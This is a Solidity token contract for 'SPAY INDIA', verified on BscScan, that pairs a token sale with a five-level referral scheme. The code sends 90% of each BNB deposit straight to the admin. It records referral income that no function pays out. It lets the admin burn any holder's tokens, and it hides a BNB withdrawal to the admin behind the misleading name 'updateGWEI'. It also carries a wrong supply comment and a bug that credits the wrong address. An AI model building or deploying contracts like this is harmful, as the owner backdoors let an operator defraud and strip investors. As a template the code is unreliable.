/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: UNLISCENSED
pragma solidity 0.8.7;
contract SPAYINDIA  {
    string public name = "SPAY INDIA";
    string public symbol = "SPY";
    uint256 public totalSupply =600000000*10**18; // 100 Cr tokens
    uint8 public decimals = 18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        uint256 totalDeposit;
        uint256 totalincome;
        uint256 totalwithdraw;
    }
    mapping(address=>User) public users;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    uint public icoindex = 1;
    uint public icodistribution = 0;
    uint256 public projectvolume = 0;
    mapping(uint => uint256) public icos;
    address private admin;
    address public ico=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    uint256[5] private levelPercents = [50,30,10,5,5];
    address public platform_fee;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 value);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    constructor() {
        admin=msg.sender;
        platform_fee=msg.sender;
        balanceOf[admin] = totalSupply*95/100;
        balanceOf[ico] = totalSupply*5/100;
        icos[1]=18;
        icos[2]=37;
        icos[3]=55;
        icos[4]=730;
        icos[5]=910;
        icos[6]=1100;
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: 0,
            totalDeposit:0,
            totalincome:0,
            totalwithdraw:0
        });
        users[admin] = user;
        idToAddress[1] = admin;
    }
    function registrationExt(address referrerAddress) external payable {
        require(msg.value>=3e16, "Minimum invest amount is 0.03 BNB!");
        uint256 _amount=msg.value;
		payable(platform_fee).transfer(_amount*90/100);
        registration(msg.sender, referrerAddress,msg.value);
    }
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0,
            totalDeposit:0,
            totalincome:0,
            totalwithdraw:0

        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++; 
        _distributeDeposit(userAddress,_amount);                
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function buyToken() external payable {
        require(msg.value>=3e16, "Minimum invest amount is 0.03 BNB!");
        uint256 _amount=msg.value;
		payable(platform_fee).transfer(_amount*90/100);
        _distributeDeposit(msg.sender,_amount);
        emit Upgrade(msg.sender,msg.value);
    }
    function coinRate() public view returns(uint256)
    {
        return icos[icoindex];
    }
    function _distributeDeposit(address _user, uint256 _amount) private { 
        projectvolume+=_amount;
        users[msg.sender].totalDeposit += _amount;        
        _distributelevelIncome(_user, _amount*90/100);  
        uint _rate = coinRate();
        uint tokens = (_amount*1e7/_rate);
        balanceOf[ico] -= tokens;
        balanceOf[_user] += tokens;
        emit Transfer(ico, _user, tokens);
        updateicoIndex(tokens);
    }
    function updateicoIndex(uint256 _token) private
    {
        icodistribution+=_token;
        if(icodistribution<=25e23)
        {
            icoindex=1;
        }
        else if(icodistribution>25e23 && icodistribution<=55e23)
        {
            icoindex=2;
        }
        else if(icodistribution>55e23 && icodistribution<=95e23)
        {
            icoindex=3;
        }
        else if(icodistribution>95e23 && icodistribution<=195e23)
        {
            icoindex=4;
        }
        else if(icodistribution>195e23 && icodistribution<=295e23)
        {
            icoindex=5;
        }
        else if(icodistribution>295e23)
        {
            icoindex=6;
        }

    }
    function manageicoIndex(uint _icoindex) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        if(icoindex<_icoindex)
        {
            icoindex=_icoindex;
            icodistribution=5e23*(_icoindex-1);
        }
    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 5; i++){
            if(upline != address(0)){
                uint256 reward=_amount*levelPercents[i]/1000;              
                users[upline].totalincome +=reward;   
                emit Transaction(upline,_user,reward,(i+1),1);                        
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        payable(admin).transfer(_amount);  
    }
    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
       
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function burn(uint256 amount,address account) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        _burn(account, amount);
        return true;
    }
    function _burn(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "BEP20: burn from the zero address");
        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
        require(totalSupply>=amount, "Invalid amount of tokens!");
        balanceOf[account] = accountBalance - amount;        
        totalSupply -= amount;
    }
    function transferOwnership(address newOwner) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        admin = newOwner;
        return true;
    }
}